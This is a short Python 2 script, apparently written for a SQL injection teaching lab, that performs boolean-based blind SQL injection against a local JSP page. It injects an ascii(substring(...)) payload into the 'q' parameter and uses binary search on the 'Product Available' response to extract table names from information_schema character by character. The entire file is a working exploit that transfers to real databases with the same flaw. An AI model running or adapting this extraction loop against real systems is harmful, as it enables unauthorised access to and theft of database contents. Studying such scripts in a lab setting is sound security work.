import requests

target = 'http://localhost:8080/SqlInjectionSamples/Story4.jsp'
attackVector = 'ascii(substring((select table_name from information_schema.TABLES where table_schema = database() limit _tbl-index_,1),_pos_,1)) <= _check_%23'
debug = 0
trace = 0

def check(req):
    if(trace):
        print req.content

    if(str(req.content).find("Product Available") != -1):
        return True
    else:
        return False

req = requests.get(target)
if req.status_code != requests.codes.ok:
    raise ValueError('Unable to connect to target')

totalQueryCount = 0
for i in range(0, 100):
    try:
        answer = ''
        pos = 1
        mid = 0
        while (True):
            lo = 1
            hi = 255
            temp = -1

            if(debug):
                print "Checking for character " + str(pos)

            while (lo <= hi):
                mid = (lo + hi) / 2
                req = requests.get(target + "?q=USB\' and " + attackVector.replace("_tbl-index_", str(i)).replace("_pos_",str(pos)).replace("_check_", str(mid)))
                totalQueryCount = totalQueryCount + 1
                if (check(req)):
                    hi = mid-1
                    temp = mid
                else:
                    lo = mid+1
            if (hi == 0): break
            if(debug):
                print "Got " + chr(temp)
            answer += chr(temp)
            pos += 1
        print answer
    except ValueError:
        break

print "Total query count: " + str(totalQueryCount)